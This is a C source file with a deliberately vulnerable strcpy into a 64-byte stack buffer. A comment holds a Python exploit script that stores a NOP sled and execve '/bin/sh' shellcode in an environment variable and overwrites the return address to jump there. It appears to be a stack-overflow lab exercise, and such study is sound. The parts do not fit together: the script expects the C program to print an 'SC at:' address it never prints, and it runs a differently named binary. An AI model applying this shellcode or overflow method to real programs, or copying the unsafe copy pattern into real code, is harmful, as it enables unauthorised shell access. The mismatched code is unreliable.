/*
CONCEPT:
	1.	Place shellcode inside an environment variable (es: export SC =...)
	2.	Use a short overflow payload that only overwrites the return address
	3.	Make it jump to the shellcode inside the environment

    -> This method keeps the overflow payload small 
*/

#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // classic unsafe overflow
}

int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}

/*
Here's the python script to generate the payload (it's not separate parts):
    import os
    import subprocess

    # --- CONFIGURATION ---
    shellcode = (
        b"\x31\xc0"             # xor    eax,eax
        b"\x50"                 # push   eax
        b"\x68//sh"             # push   "//sh"
        b"\x68/bin"             # push   "/bin"
        b"\x89\xe3"             # mov    ebx,esp
        b"\x50"                 # push   eax
        b"\x53"                 # push   ebx
        b"\x89\xe1"             # mov    ecx,esp
        b"\x99"                 # cdq
        b"\xb0\x0b"             # mov    al,0xb
        b"\xcd\x80"             # int    0x80
    )

    nop_sled = b"\x90" * 100
    env_payload = nop_sled + shellcode

    # --- STEP 1: Set environment variable ---
    os.environ["SC"] = env_payload.decode('latin1')  # Must use latin1 to keep bytes intact

    # --- STEP 2: Get address of SC by running the program ---
    result = subprocess.run(["./c_program", "TEST"], capture_output=True, env=os.environ)
    for line in result.stdout.decode().splitlines():
        if "SC at:" in line:
            sc_address = int(line.split(":")[1].strip(), 16)
            print(f"[+] Shellcode address found: {hex(sc_address)}")
            break
    else:
        print("[-] Failed to find shellcode address")
        exit(1)
       
    # --- STEP 3: Build the buffer overflow payload ---
    buffer_size = 64
    ebp_size = 4
    padding = b"A" * (buffer_size + ebp_size)
    ret = sc_address.to_bytes(4, byteorder="little")
    payload = padding + ret

    # --- STEP 4: Run the vulnerable program with the payload ---
    print("[*] Running exploit...")
    os.execve("./env_bof", ["./env_bof", payload.decode('latin1')], os.environ)

    // end of script
*/
